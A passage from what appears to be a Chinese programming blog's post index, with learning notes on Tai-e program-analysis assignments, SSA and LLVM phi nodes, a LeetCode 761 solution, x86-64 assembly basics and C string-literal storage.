c;}对于switch语句，如果条件是常数那么是否会产生不可达代码取决于case和default的具体实现。例如：int unreachableSwitchBranch() { int x = 2, y; switch (x) { case 1: y = 100; break; // unreachable branch case 2: y = 200; case 3: y = 300; break; // fall through default: y = 666; // unreachable branch } return y;}检测方式：对if语句，判断条件值是否为常量，如果是常量，则根据常量值来选择将then或else语句加入死代码。对于switch语句，同样判断条件值是否为常量，switch相比if更为复杂，将在后文进一步阐述。无用赋值局部变量被赋值后没有被后续语句读取，那么将不会影响后续的计算结果，因而可以被消除：int deadAssign() { int a, b, c; a = 0; // dead assignment a = 1; b = a * 2; // dead assignment c = 3; return c;}检测方式：进行活跃变量分析，如果左侧的变量是not live的，那么这条语句就是死代码。存在一种特殊情况：右边是函数调用，过程内分析无法判断函数是否对变量值产生影响，因此将函数调用统一视为活跃代码。具体设计采用广度优先搜索来遍历整个控制流图。对于控制流图的每一条边，检查其target结点是否已经在isReached（HashSet，其中存储已经访问过的statement）中或已经被检测出为deadCode，前者是为了防止在环路中陷入死循环，后者是为了防止出现漏报。无用赋值检测非常容易，因为已经实现了活跃变量检测，因此只需要对赋值语句检查左侧变量是否在当前语句的活跃变量集合中。对于if语句，首先需要通过ConstantPropagation.evaluate计算条件值，并判断是否为常量。如果是常量0，那么if-then语句将不会被执行， 将其加入deadCode。注意此时if语句的后续两条边IF_TRUE和IF_ELSE已经加入了队列，但是在将IF_TRUE加入到deadCode后，队列中的这一语句将会被忽略，因此这一条件分支的代码也将不会被加入到isReached集合中，并在后续的分支不可达检测中被加入到deadCode中。对于switch语句，类似地，计算条件值，并判断执行哪一条case语句。switch的难点在于，即使case条件没有满足，如果上一条满足条件的case没有break，那么该条指令依然可以执行。例如:int unreachableSwitchBranch() { int x = 2, y; switch (x) { case 1: y = 100; break; // unreachable branch case 2: y = 200; break; case 3: y = 300; // fall through default: y = 666; // reachable branch } return y;}但是，上一条case语句只有全部执行完之后才能够判断是否有break跳转，看起来是深度优先，而我使用的是广度优先，那么要如何将两者融合在一起？比较一下二者的控制流图，可以发现两者的主要不同在于在case8后有一条到default的路径（第一张图为break，第二张图为无break，由于大小原因，仅截取部分）：因此，我们可以将当前switch的所有指向case或default的case语句从待遍历队列的首部删掉，而仅仅插入case与switch条件值一致的语句，并按照控制流图继续向下遍历，如果该case没有break，那么后续的case或default最终也可以作为当前case的后继而遍历到。而没有被遍历到的语句将在可达性检测中加入到deadCode中。最后的可达性检测，依次遍历控制流图的每个结点并判断是否被访问过，如果没有被访问过，则说明是不可达代码，加入到deadCode中。总结deadCode是课程设置中DFA分析的最后一个实验，基于前面的常量传播分析和活跃变量分析，主要的难度在于比较抽象，使用Graphviz来绘制分析出的cfg图能够更好的帮助debug和理解测试用例。" }, { "title": "Tai-e Assignment 2 常量传播和Worklist求解器", "url": "/_posts/Tai-e-Assignment2/", "categories": "程序分析", "tags": "程序分析", "date": "2022-09-09 00:00:00 +0000", "snippet": " 『 无论你是玩游戏多，还是成绩不太好，觉得自己没有别人毕业有优势，这都是因为浮躁、去比较产生的事情。这门课，老师希望你重新的审视自己，不断地认识自己、挖掘自己，看看真的什么东西能让你你快乐起来，什么东西能让你花时间去搞。哪怕你以后只是开了一家奶茶店，哪怕是一个和计算机毫无相关的行业，也希望你能从这门课中清楚的认识到自己喜欢的是什么，你不是没有别人优秀，你只是选择了你喜欢的事情。 』 \t\t...", "content": " 『 无论你是玩游戏多，还是成绩不太好，觉得自己没有别人毕业有优势，这都是因为浮躁、去比较产生的事情。这门课，老师希望你重新的审视自己，不断地认识自己、挖掘自己，看看真的什么东西能让你你快乐起来，什么东西能让你花时间去搞。哪怕你以后只是开了一家奶茶店，哪怕是一个和计算机毫无相关的行业，也希望你能从这门课中清楚的认识到自己喜欢的是什么，你不是没有别人优秀，你只是选择了你喜欢的事情。 』 \t\t\t\t\t——李樾Overview实现int类型的常量传播，boolean、byte、char和short类型同样被视为int，其他类型可以被忽略。语句处理只需要关注赋值语句，主要包括三种： 常量赋值， x = 1 变量赋值，x = y 表达式赋值，x = a+b在表达式中可能会出现的二元运算符： 运算类型 运算符 Arithmetic + - * / % Condition == != &lt; &gt; &lt;= &gt;= Shift &lt;&lt; &gt;&gt; &gt;&gt;&gt; Bitwise | &amp; ^ 其中Java中逻辑运算符以分支跳转形式实现，因此不需要处理。设计初始化在newBoundaryFact中，对于具有参数的函数来说，应该将参数插入到CPFact中，并将其值设置为NAC，因为在函数看来参数的值未知，所以是NAC（not a constant)。而如果返回空CPFact，变量的值将会被视为UNDEF。meetInto这里的meetInto使用了与Assignment类似的设计，调用meetValue函数来将target和fact两者合并。根据PPT中的说明，合并规则为:NAC ^ v = NACUNDEF ^ v = vc ^ c = cc1 ^ c2 = NACevaluate计算给定表达式的值，容易出错的地方在于%和/在除数是0时，无论另一个操作数的值是什么都要返回Undef。transferNode常量传播分析的语句为DefinitionStmt，因此首先需要判断stmt的类型，并将stmt显式转换为DefinitionStmt，可以使用模板来实现自动类型推导：DefinitionStmt&lt;?, ?&gt; definitionStmt = (DefinitionStmt&lt;?, ?&gt;)stmt;doSolveForward常量传播使用前向分析的workList算法，将workList初始化为队列，并将控制流图中的结点全部加入到workList。workList中每个结点所有前驱的OUTFact集合的交集作为该节点的IN集合，并且通过比较新的OUT与原本的OUT是否一致来判断是否将该节点的后继加入到workList。由于OUT的改变仅依赖于IN的改变，所以最终会收敛到一个不动点，算法结束，常量分析完成。后记完成Assignment3之后才想起来没有写Assignment2的总结，debug时遇到的很多细节已经模糊，只记得过程非常痛苦。Assignment 2是所有8个实验中通过率最低的一个，截至我完成时通过率只有7%。骥恺给了我两个参考文档：Testcase about A2 · Issue #2 · pascal-lab/Tai-e-assignments (github.com)和 SPA-Freestyle-Guidance/Assignment 2.md at main · RicoloveFeng/SPA-Freestyle-Guidance (github.com)以及自己通过测试的代码，经过反复比对输出结果才得以在较短的时间内通过这个实验，即使如此依然WA多次。截至今天，完成了全部DFA的学习，即将进入过程间分析，希望能够顺利完成全部课程。" }, { "title": "Tai-e Assignment 1 活跃变量分析和迭代求解器", "url": "/_posts/Tai-e-Assignment1/", "categories": "程序分析", "tags": "程序分析", "date": "2022-09-03 00:00:00 +0000", "snippet": " 『 无论你是玩游戏多，还是成绩不太好，觉得自己没有别人毕业有优势，这都是因为浮躁、去比较产生的事情。这门课，老师希望你重新的审视自己，不断地认识自己、挖掘自己，看看真的什么东西能让你你快乐起来，什么东西能让你花时间去搞。哪怕你以后只是开了一家奶茶店，哪怕是一个和计算机毫无相关的行业，也希望你能从这门课中清楚的认识到自己喜欢的是什么，你不是没有别人优秀，你只是选择了你喜欢的事情。 』 \t\t...", "content": " 『 无论你是玩游戏多，还是成绩不太好，觉得自己没有别人毕业有优势，这都是因为浮躁、去比较产生的事情。这门课，老师希望你重新的审视自己，不断地认识自己、挖掘自己，看看真的什么东西能让你你快乐起来，什么东西能让你花时间去搞。哪怕你以后只是开了一家奶茶店，哪怕是一个和计算机毫无相关的行业，也希望你能从这门课中清楚的认识到自己喜欢的是什么，你不是没有别人优秀，你只是选择了你喜欢的事情。 』 \t\t\t\t\t——李樾Overview作业1是为Java实现活跃变量分析，其中需要的程序分析接口和数据流信息的表示、程序流图等结构都已经在Tai-e框架中提供，只需要补全几个关键部分。一共需要实现6个方法：LiveVariableAnalysis: SetFact newBoundaryFact(CFG) SetFact newInitialFact() void meetInto(SetFact,SetFact) boolean transferNode(Stmt,SetFact,SetFact)Solver: Solver.initializeBackward(CFG,DataflowResult) IterativeSolver.doSolveBackward(CFG,DataflowResult)在一开始看到LiveVariableAnalysis时可能会有一头雾水的感觉，我认为从逻辑上来说先实现Solver再实现LiveVariableAnalysis中的几个方法更加合理。Algorithm我们所需要实现的活跃变量分析算法的伪代码如上图所示，首先执行初始化将CFG中每个结点的IN set和OUT set置为空集。然后对于CFG中的每个基本块B，分别使用meetInto和transferNode计算OUT[B]和IN[B]，一直到CFG中每个basic block的IN set不再改变为止。框架中对这一算法进行了简化，将每条语句作为basic block来处理。结点初始化public SetFact&lt;Var&gt; newBoundaryFact(CFG&lt;Stmt&gt; cfg)用于对exit结点初始化，其参数cfg在assignment1中并没有被使用。public SetFact&lt;Var&gt; newInitialFact()用于对其他结点初始化。这两个函数实际上功能相同，都只需要返回一个为空的Var集合更新OUT集合按照实验手册，meetInto的行为是将fact集合合并入target集合，其中target为OUT[B]，fact为IN[S]，S为B的后继。直接将后继的IN集合合并到B的OUT集合可以避免集合的多次拷贝，提高运行效率。对应地我们也需要对算法作一定改动：在对IN集合初始化时一并将set初始化。SetFact中给出了两个Set合并的接口，直接调用即可。更新IN集合transferNode函数与前面几个函数不同，返回类型boolean用于在迭代时判断是否应该终止迭代，因此在结束时应该判断新的IN集合与旧的IN集合是否相同。在这里我犯了一个错误：SetFact给出了copy和set两个方法，我误以为new_in = out.copy()就创建了out的一个名为new_in的副本，但是实际上copy执行的是浅拷贝，对new_in的修改实际上一并修改了out，从而影响后面的分析结果。正确的拷贝方法应该是使用set：SetFact&lt;Var&gt; new_in = new SetFact&lt;&gt;();new_in.set(out);同时我们执行的是活跃变量分析，只需考虑Var类型，而在语句中可能存在立即数等各种不同类型，因此需要对stmt.getDef和stmt.getUses的返回结果进行过滤，否则在类型转换时会抛出异常。开始时我使用use.getClass().toString()判断是否为class pascal.taie.ir.exp.Var，后来了解到使用java的instanceof特性可以更为优雅地实现。在断定类型为Var后，通过强制类型转换插入到In和OUT中实现更新，完整的代码如下:public boolean transferNode(Stmt stmt, SetFact&lt;Var&gt; in, SetFact&lt;Var&gt; out) { // TODO - finish me // IN = use U (OUT - def) SetFact&lt;Var&gt; new_in = new SetFact&lt;&gt;(); new_in.set(out); Optional&lt;LValue&gt; def = stmt.getDef(); if (def.isPresent() &amp;&amp; def.get() instanceof Var) { new_in.remove((Var) def.get()); } List&lt;RValue&gt; uses = stmt.getUses(); for (RValue use : uses) { if (use instanceof Var) new_in.add((Var)use); } if (in.equals(new_in)) { return false; } else { in.set(new_in); return true; } }实现迭代求解器initializeBackward执行初始化过程，将CFG中的每个结点及利用上述初始化函数初始化后的IN和OUT集合插入到result中即可。doSolveBackward函数则是算法进行迭代的关键。内层循环遍历CFG的每个结点，分别调用meetInto和transferNode函数来更新IN和OUT两个集合。为了判断IN有没有发生改变，我引入了一个bool类型的变量flag，每次与transferNode的返回值相或，这样一旦flag为false，说明没有发生任何一个结点的IN集合发生改变，跳出循环，分析结束。在这里我踩了一个大坑。由于PPT中所展示的手动分析过程从CFG的末尾结点开始向上查询，因此我在开始时定义了一个队列，用来实现倒序遍历CFG，但是实际上对本次实验来说并无必要。我认为倒序和正序的主要区别在于，正序遍历时第一趟前面几个结点的IN和OUT两个集合没有发生改变，而倒序从底部出发，一次遍历就可以更改程序路径上的所有节点，因此倒序的效率应该更高，但正序的代码实现相比倒序更加简洁直观，因此最后还是采用了正序遍历。ReferenceSPA-Freestyle-Guidance/Assignment 1.md at main · RicoloveFeng/SPA-Freestyle-Guidance (github.com) [作业 1：活跃变量分析和迭代求解器 Tai-e (pascal-lab.net)](http://tai-e.pascal-lab.net/pa1.html) " }, { "title": "Static single-assignment form (SSA)", "url": "/_posts/SSA/", "categories": "LLVM", "tags": "LLVM, 编译原理, 程序分析", "date": "2022-08-26 00:00:00 +0000", "snippet": " LLVM要求输入代码为SSA形式，那么什么是SSA以及如何利用LLVM将拥有可变类型的代码转换为SSA形式？SSA是IR的一种属性，要求每个变量仅被赋值一次并在被使用前定义。在初始的IR中已经存在的变量被划分为不同的版本，新的变量通常由原始名称和下标表示，因此每个定义实际上都有自己的不同版本。在SSA中，use-def链是显式的，并且每个链都包含一个单独的变量。use-def链是一种特殊...", "content": " LLVM要求输入代码为SSA形式，那么什么是SSA以及如何利用LLVM将拥有可变类型的代码转换为SSA形式？SSA是IR的一种属性，要求每个变量仅被赋值一次并在被使用前定义。在初始的IR中已经存在的变量被划分为不同的版本，新的变量通常由原始名称和下标表示，因此每个定义实际上都有自己的不同版本。在SSA中，use-def链是显式的，并且每个链都包含一个单独的变量。use-def链是一种特殊的数据结构：其中包含了一次定义和若干次使用，用于静态程序分析如数据流分析、可达性分析等中。use-def链是很多编译器优化的前置条件，包括常量传播和公共子表达式消除等。SSA的优点在于可以通过简化变量的属性来同时简化和提高编译器优化的效果。例如：y := 1y := 2x := y通过SSA可以表达为如下的形式：y.1 = 1y.2 = 1x.1 = y.2因此可以在优化时将y:=1这一并没有被使用到的赋值消除。Converting to SSA将普通代码转换为SSA形式主要是将每个赋值目标替换为一个新的变量，并将其每次使用替换为该点对应的变量的版本：例如将下图所示的控制流图转换为SSA表示:将x&lt;-x-3替换为x.2 &lt;- x.1-3，并将对应的版本扩散到所有的基本块中，可以得到如下的SSA表示：可以看到在上层的三个基本块中，可以根据变量名和版本非常容易地追溯到每个变量定义和修改的位置，但是在底部的基本块中，由于前面出现了分支指令，因此w.2中使用的y的值取决于执行时选择了哪一条执行路径。为了解决这个问题，在基本块中引入了一条新的指令，称为Phi函数。Phi函数的作用是根据之前的控制流来选择y.1或y.2用以生成y.3的定义，引入Phi函数后的控制流图如下所示：大多数机器都没有实现与Phi函数对应的特殊指令，因此通常由编译器通过在每个预处理块后插入move指令来实现。例如，在上例中，编译器必须在左侧block的末尾添加从y.1到y.3的move指令，在右侧block的末尾添加从y.2到y.3的move指令。Computing minimal SSA using dominance frontiers对于任意给定的控制流图，通常采用dominance frontiers方法来选择插入Phi函数的位置。首先需要定义dominator的概念：如果任何到达节点B的执行路径都必须首先经过节点A，那么就称节点A严格控制节点B。如果A严格控制B或A = B，那么就说A控制B（B被A控制）。并且通过严格控制，我们可以得到如下结论：如果当前指令执行到了B，那么节点A中的指令必然已经全部执行完毕。接下来定义dominance frontier：如果A没有严格控制B，但是控制了一些B的直接前驱，或A是B的直接前驱，并且由于任何节点控制其自身，那么我们称节点B在A的dominance frontier中。从节点A的角度来看，这些节点是其他不经过A的控制路径中最早出现的节点。dominance frontier给出了需要插入Phi函数的位置：如果节点A定义了某个变量，那么该定义将会传播到被A控制的每个结点。只有当离开了这些被控制的结点并进入了dominance frontier时，才需要插入Phi指令来不同的控制流选择变量的版本。LLVM 中生成Phi函数在LLVM Kaleidoscope中给出了一个控制流图的实例：需要将对应的if/then/else基本块转换为LLVM IR指令。在then和else两个分支执行完后重新回到ifcont这个block来继续执行后续的指令，在这个示例中需要根据前面控制流的执行情况来判断调用的函数，因此如前所述需要引入Phi函数来实现SSA。在实践中，实际上只有两种情况需要使用Phi结点： 使用了用户变量的代码：x = 1; x = x + 1; 在AST结构中隐含的值，例如上例中的IfExprAST节点类，其中隐含了If/Then/Else三种blockLLVM IR for AST(If/Then/Else)对于第二类情况，可以直接插入Phi结点，在上例中，使用llvm生成If/then/else block对应的IR，代码如下：// 获得要生成If/then/else block的函数llvm::Function *TheFunction = Builder.GetInsertBlock()-&gt;getParent();// 为then和else block创建block，并在TheFuntion后插入then block。llvm::BasicBlock *ThenBB = llvm::BasicBlock::Create(TheContext, \"then\", TheFunction);// 因为CreateBlock并没有隐式修改Builder, 因此else block不能直接插入到TheFunction后llvm::BasicBlock *ElseBB = llvm::BasicBlock::Create(TheContext, \"else\");// ifcont blockllvm::BasicBlock *MergeBB = llvm::BasicBlock::Create(TheContext, \"ifcont\");// 创建跳转到ThenBB和ElseBBd的分支Builder.CreateCondBr(CondV, ThenBB, ElseBB);// 在创建条件分支被插入后，移动Builder来开始ThenBB, 即then block，更确切的说，Builder.SetInsertPoint(ThenBB)将指向插入位置的指针移动到ThenBB的末尾。Builder.SetInsertPoint(ThenBB);// 生成Then block的代码llvm::Value *ThenV = Then-&gt;codegen();if (!ThenV) return nullptr;// 为了结束then block，创建一个无条件分支到merge block，即MergeBB.Builder.CreateBr(MergeBB);// Then-&gt;codegen会改变当前的block，因此需要更新ThenBBThenBB = Builder.GetInsertBlock();// Else block与then block基本一致// Emit else blockTheFunction-&gt;getBasicBlockList().push_back(ElseBB);Builder.SetInsertPoint(ElseBB);llvm::Value *ElseV = Else-&gt;codegen();if (!ElseV) \treturn nullptr;Builder.CreateBr(MergeBB);ElseBB = Builder.GetInsertBlock();// 生成MergeBBTheFunction-&gt;getBasicBlockList().push_back(MergeBB);// 设置插入点为MergeBB, 后续新创建的代码将会被加入到MergeBB中Builder.SetInsertPoint(MergeBB);llvm::PHINode *PN = Builder.CreatePHI(llvm::Type::getDoubleTy(TheContext), 2, \"iftmp\");PN-&gt;addIncoming(ThenV, ThenBB);PN-&gt;addIncoming(ElseV, ElseBB);return PN;​\t！注意：llvm IR需要所有的基本块以一个控制流指令结尾，例如return或branch指令，这意味着LLVM IR中所有的控制流指令都需要显式创建，否则verifier将会抛出一个错误。例如上例中的 Builder.CreateBr(MergeBB);LLVM IR for mutable variables首先，理解mutable variable在转换为SSA形式时出现的问题，考虑如下代码：int G, H;int test(_Bool Condition) { int X; if (Condition) X = G; else X = H; return X;}最终返回的X的值取决于条件分支的转移路径，因此需要使用Phi函数来合并两个不同的值，与上面C代码对应的LLVM IR如下所示：@G = weak global i32 0 ; type of @G is i32*@H = weak global i32 0 ; type of @H is i32*define i32 @test(i1 %Condition) {entry: br i1 %Condition, label %cond_true, label %cond_falsecond_true: %X.0 = load i32, i32* @G br label %cond_nextcond_false: %X.1 = load i32, i32* @H br label %cond_nextcond_next: %X.2 = phi i32 [ %X.1, %cond_false ], [ %X.0, %cond_true ] ret i32 %X.2}与LLVM IR for AST的不同在于，在两个不同的分支中，只有变量X的值被改变，而AST的CFG中涉及了过程间跳转。LLVM要求寄存器以SSA形式来使用，但对于内存对象并没有要求。LLVM中使用Analysis Pass来处理对于内存数据流的分析。LLVM中所有的内存访问都通过显式的load/store指令来实现，并且并不需要address-of操作符。@G和@H的类型为i32 *，这意味着@G在全局数据空间中为@G分配了一块i32大小的空间，但是其名字@G实际上指向的是这块空间的地址。栈变量的定义方式相同，区别仅在于全局变量定义在全局数据空间中，栈变量通过alloca指令来定义，例如：define i32 @example() {entry: %X = alloca i32 ; type of %X is i32*. ... %tmp = load i32, i32* %X ; load the stack value %X from the stack. %tmp2 = add i32 %tmp, 1 ; increment it store i32 %tmp2, i32* %X ; store it back ...通过alloca定义的栈变量比寄存器更加灵活，例如可以将栈变量的地址作为参数传递给函数或是用于保存其他变量。通过使用alloca可以避免对于Phi的使用：@G = weak global i32 0 ; type of @G is i32*@H = weak global i32 0 ; type of @H is i32*define i32 @test(i1 %Condition) {entry: %X = alloca i32 ; type of %X is i32*. br i1 %Condition, label %cond_true, label %cond_falsecond_true: %X.0 = load i32, i32* @G store i32 %X.0, i32* %X ; Update X br label %cond_nextcond_false: %X.1 = load i32, i32* @H store i32 %X.1, i32* %X ; Update X br label %cond_nextcond_next: %X.2 = load i32, i32* %X ; Read X ret i32 %X.2}通过使用alloca，我们发现了一种可以处理任意的可变变量而不需要创建Phi结点的方式。 将每个可变变量的定义变为在栈上分配内存 变量的每次读改为load指令 变量的每次写改为store指令 取变量地址直接使用变量名但是alloca带来了一个新的问题：之前对于寄存器的直接访问变为了对于内存的访问，从而会带来性能上的损失。LLVM optimizer提供了一个称为mem2reg的pass来将alloca提升为SSA寄存器，并在合适的地方插入Phi结点。mem2reg实现了标准的iterated dominance frontier 算法来构建SSA，mem2reg尽在满足如下条件的变量上起作用： mem2reg寻找alloca指令，并且判断对应的变量是否可以提升。对于全局变量或堆上的内存分配不起作用。 mem2reg仅在函数入口块处查找alloca, 在入口块中保证了alloca仅仅执行一次，简化分析过程 mem2reg仅提升对于变量的直接读写（e.g.对于变量名所指的直接地址的load和store），如果栈对象被传递给一个函数或出现了对于栈指针的算术运算，那么不会被mem2reg提升。 mem2reg仅对所谓的first class （即指针、标量和向量等）values或长度为1的array生效，而不能将结构体或数组提升为寄存器。sroa pass可以提升结构体，union和数组。LLVM for variables mutation首先需要对函数的入口块创建alloca:static llvm::AllocaInst *CreateEntryBlockAlloca(llvm::Function *TheFunction, const std::string &amp;VarName) { // 创建了一个指向函数入口第一条指令的IRBuilder\tllvm::IRBuilder&lt;&gt; TmpB(&amp;TheFunction-&gt;getEntryBlock(), TheFunction-&gt;getEntryBlock().begin()); // 创建名为VarName的变量的alloca指令，默认所有的变量类型均为double\treturn TmpB.CreateAlloca(llvm::Type::getDoubleTy(TheContext), 0, VarName.c_str());}同时对于变量的访问方式发生了改变：// 在entry block中为变量创建allocallvm::AllocaInst *Alloca = CreateEntryBlockAlloca(TheFunction, VarName);// 为start生成StartValllvm::Value *StartVal = Start-&gt;codegen();if (!StartVal) return nullptr;// 将StartVal保存到Alloca中Builder.CreateStore(StartVal, Alloca);// 重新将alloca中保存的变量加载到寄存器llvm::Value *CurVar = Builder.CreateLoad(Alloca);添加mem2reg pass：// 将alloca提升到寄存器TheFPM-&gt;add(createPromoteMemoryToRegisterPass());// peephole和bit-twiddling优化TheFPM-&gt;add(createInstructionCombiningPass());// Reassociate expressions.TheFPM-&gt;add(createReassociatePass());Reference 5. Kaleidoscope: Extending the Language: Control Flow — LLVM 16.0.0git documentation 7. Kaleidoscope: Extending the Language: Mutable Variables — LLVM 16.0.0git documentation Static single-assignment form - Wikipedia" }, { "title": "LeetCode 761 特殊的二进制序列", "url": "/_posts/LeetCode-761%E9%A2%98%E8%A7%A3/", "categories": "Leetcode, algorithm", "tags": "C/C++, LeetCode, algorithm", "date": "2022-08-09 00:00:00 +0000", "snippet": "Description特殊的二进制序列是具有以下两个性质的二进制序列： 0 的数量与 1 的数量相等。 二进制序列的每一个前缀码中 1 的数量要大于等于 0 的数量。给定一个特殊的二进制序列 S，以字符串形式表示。定义一个操作 为首先选择 S 的两个连续且非空的特殊的子串，然后将它们交换。（两个子串为连续的当且仅当第一个子串的最后一个字符恰好为第二个子串的第一个字符的前一个字符。)在任意...", "content": "Description特殊的二进制序列是具有以下两个性质的二进制序列： 0 的数量与 1 的数量相等。 二进制序列的每一个前缀码中 1 的数量要大于等于 0 的数量。给定一个特殊的二进制序列 S，以字符串形式表示。定义一个操作 为首先选择 S 的两个连续且非空的特殊的子串，然后将它们交换。（两个子串为连续的当且仅当第一个子串的最后一个字符恰好为第二个子串的第一个字符的前一个字符。)在任意次数的操作之后，交换后的字符串按照字典序排列的最大的结果是什么？Solution题目描述可以概括为如下内容： 要求是对给定字符串进行排序，并且被排序的元素为01组成的特殊序列 特殊序列01相等，并且前缀中1的数量大于0的数量-&gt;第一位肯定是1，最后一位肯定是0，否则无法保证前缀首先介绍一个结论：如果一个序列中，相邻的元素可以相互交换，那么一定可以通过冒泡排序的方法进行任意的排序，以得到字典序最大或最小的序列。因为进行排序的对象为01特殊序列，因此对给定序列进行划分，不断地分割出特殊的子序列，首先在子序列内部进行递归排序，得到最大的子序列，然后子序列之间进行排序，得到完整的序列。递归的终止条件为输入字符串的长度小于等于2时，直接返回。并且由于特殊序列的第一位一定是1，末位一定是0，因此在向下传参时可以将首位剥离。完整的代码如下:class Solution {public: string makeLargestSpecial(string s) { if (s.size() &lt;= 2) return s; int count = 0; vector&lt;string&gt; store; int left = 0; for (int i = 0; i &lt; s.size(); i++) { if (s[i] == '1') count++; else count--; // count == 0表示前半序列0的数量和1的数量相等，同时我还要判断后面的半个序列是否满足要求 if (count == 0) { store.push_back(\"1\" + makeLargestSpecial(s.substr(left + 1, i - left - 1)) + \"0\"); left = i + 1; } } sort(store.begin(), store.end(), greater&lt;string&gt;{}); string res; for (auto iter = store.begin(); iter != store.end(); iter++) { res += *iter; } return res; }};" }, { "title": "x86-64 Assembly notes", "url": "/_posts/X86-64-Assembly-notes/", "categories": "Assembly", "tags": "Assembly", "date": "2022-08-07 00:00:00 +0000", "snippet": "Registers用于保存前六个参数和返回值的寄存器是callee-owned，即被调用者所有。被调用者可以任意修改和读取这些寄存器的值。如果调用者需要继续使用%rax中的值，那么需要在安全的位置保存一份副本（因为无法保证被调用者不会修改%rax中的值，其他也同理。）如果被调用者希望使用caller-owned寄存器，必须首先保存寄存器的值，并在函数结束前将其恢复。 R...", "content": "Registers用于保存前六个参数和返回值的寄存器是callee-owned，即被调用者所有。被调用者可以任意修改和读取这些寄存器的值。如果调用者需要继续使用%rax中的值，那么需要在安全的位置保存一份副本（因为无法保证被调用者不会修改%rax中的值，其他也同理。）如果被调用者希望使用caller-owned寄存器，必须首先保存寄存器的值，并在函数结束前将其恢复。 Register 用途 %rax 函数返回值， callee-owned %rdi 1st argument, callee-owned %rsi 2nd argument, called-owned %rdx 3rd argument, called-owned %rcx 4th argument, callee-owned %r8 5th argument, callee-owned %r9 6th argument, callee-owned %r10/%r11 临时使用， callee-owned %rsp 栈指针，caller-owned %rbx/%rbp/%r12/%r13/%r14/%r15 局部变量，caller-owned %rip 指针寄存器 %eflags 状态/条件位寄存器 %rbp是x86_64的栈基底指针，%rsp是x86_64的栈顶指针Addressing modes寻址方式主要包括直接寻址和间接寻址等。以mov指令为例：mov src, dstmovl $1, 0x604892 #直接寻址，目标操作数为目的地址movl $1, (%rax)\t #寄存器间接寻址，目标操作数存储在寄存器%rax中movl $1, -24(%rbp) #目标地址 = (%rbp) - 24movl $1, 8(%rsp, %rdi, 4) # 目标地址 = %rsp+8+%rdi*4movl $1, (%rax, %rcx, 8) # 目标地址 = %rsp + %rcx * 8movl $1, 0x8(, %rdx, 4) # 目标地址 = 0x8 + %rdx * 4movl $1, 0x4(%rax, %rcx) # 目标地址 = 0x4 + %rax + %rcxCommon instructions指令的后缀(b, w, l, q)指明了操作数的位宽，如果通过操作数可以推断出位宽则可以省略后缀。例如%eax必须是4字节。某些指令可能有不止一个后缀，例如movzbl表示将1字节的源操作数移动到4字节的目标地址。在目标操作数是子寄存器时，通常情况下只有子寄存器中的特定字节会被写入，但32bit指令会将目标寄存器的高位置零。Mov and leamov将源操作数中的数据拷贝到目的操作数中。源操作数可以是立即数、寄存器或内存地址，目的操作数可以时寄存器或内存地址。后缀b,w,l,q代表了拷贝的数据位宽。lea指令的源操作数是一个内存地址，并将计算后的源操作数的地址拷贝到目的操作数中。lea的作用是计算地址，而没有移动地址中存放的数据，movs和movz用于从位宽较小的寄存器拷贝到更长的寄存器中，指明寄存器高位填充的方式，其中movs进行符号扩展，即将最高有效位复制到寄存器的高位，movz进行零扩展，即将高位直接置零。(mov在使用32bit的寄存器作为源操作数时默认进行零扩展)cltq指令是特殊的movs指令，源操作数是%eax ,目的操作数是%rax，用于在%rax上进行符号扩展。Arithmetic and bitwise operations二元运算指令的第二个操作数既是源操作数又是目标操作数。一元运算指令的操作数既是目的地址又是源地址。Branches and other use of condition codes%eflags作为状态寄存器，其中 保存了一系列用于条件判断的标志位。ZF为0标志位，SF作为符号标志位，OF为溢出标志位，CF为进位位。用法:cmpl op2, op1 # computes result = op1 - op2, discards result, sets condition codestest op2, op1 # computes result = op1 &amp; op2, discards result, sets condition codesjmp target # unconditional jumpje target # jump equal, synonym jz jump zero (ZF=1)jne target # jump not equal, synonym jnz jump non zero (ZF=0)js target # jump signed (SF=1)jns target # jump not signed (SF=0)jg target # jump greater than, synonym jnle jump not less or equal (ZF=0 and SF=OF)jge target # jump greater or equal, synonym jnl jump not less (SF=OF)jl target # jump less than, synonym jnge jump not greater or equal (SF!=OF)jle target # jump less or equal, synonym jng jump not greater (ZF=1 or SF!=OF)ja target # jump above, synonym jnbe jump not below or equal (CF=0 and ZF=0)jae target # jump above or equal (CF=0)jb target # jump below, synonym jnae jump not above or equal (CF=1)jbe target # jump below or equal (CF=1 or ZF=1)setx and movxsetx将目标寄存器根据条件x设置为0或1，其目标操作数只能为单字节的子寄存器，例如%rax的低字节%al。cmovx根据条件x选择是否执行mov指令，源操作数和目的操作数都只能是寄存器。其中x是条件变量的占位符。sete dst # set dst to 0 or 1 based on zero/equal conditionsetge dst # set dst to 0 or 1 based on greater/equal conditioncmovns src, dst # proceed with mov if ns condition holdscmovle src, dst # proceed with mov if le condition holdsFunction Call Stackpush和pop指令用于操作栈中元素，函数调用者在执行被调用的函数前，首先需要设置寄存器，将传递的参数写入到寄存器%rdi, %rsi, %rdx, %rcx, %r8, %r9中Reference【1】CS107 Guide to x86-64 (stanford.edu)【2】Guide to x86 Assembly (yale.edu)" }, { "title": "字符串字面值作为实参时，被放在哪了？", "url": "/_posts/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%97%E9%9D%A2%E5%80%BC%E4%BD%9C%E4%B8%BA%E5%AE%9E%E5%8F%82%E6%97%B6,%E8%A2%AB%E5%AD%98%E6%94%BE%E5%9C%A8%E5%93%AA%E4%BA%86/", "categories": "C/C++", "tags": "C/C++, Assembly, objdump", "date": "2022-08-05 00:00:00 +0000", "snippet": " coding时突然想到的一个问题？在写NJU os的libco时，看到给的使用示例里有这么一段代码:#include &lt;stdio.h&gt;#include \"co.h\"void entry(void *arg) { while (1) { printf(\"%s\", (const char *)arg); co_yield(); }}int main() { s...", "content": " coding时突然想到的一个问题？在写NJU os的libco时，看到给的使用示例里有这么一段代码:#include &lt;stdio.h&gt;#include \"co.h\"void entry(void *arg) { while (1) { printf(\"%s\", (const char *)arg); co_yield(); }}int main() { struct co *co1 = co_start(\"co1\", entry, \"a\"); struct co *co2 = co_start(\"co2\", entry, \"b\"); co_wait(co1); // never returns co_wait(co2);}对应的函数签名为:struct co *co_start(const char *name, void (*func)(void *), void *arg);众所周知，函数的局部变量在函数返回后将会被销毁，因此对于在函数返回后还要使用的变量就需要使用static将其声明为静态变量或使用malloc从堆上分配空间，否则将会产生use-after-free。那么疑问随之而来: 如上例所示使用字符串字面值作为函数参数，这个字符串将会被存放在哪？为了简化问题，重新写了一个小的demo：struct testread { char *arg; int* value;};struct testread* test(void * arg, int *i);struct testread* ttest();int main() { struct testread*ret = ttest(); printf(\"%s %d\\n\", ret-&gt;arg, 